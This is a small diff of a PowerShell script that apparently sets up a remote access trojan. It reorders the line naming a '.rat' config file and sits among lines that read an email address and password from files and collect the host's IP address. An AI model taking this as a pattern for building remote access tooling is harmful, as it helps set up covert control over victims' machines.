@@ -31,9 +31,10 @@ $directory = random_text(5)
 $temp_dir = "$env:TEMP\$directory"
 # save current directory
 $curr_dir = Get-Location|%{$_.Path}
-$config_file = "$env:username.rat"
+
 $email = Get-Content .\email.txt
 $password = Get-Content .\password.txt
+$config_file = "$env:username.rat"
 $ip = (Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|select -Last 1
 
 # generate config file
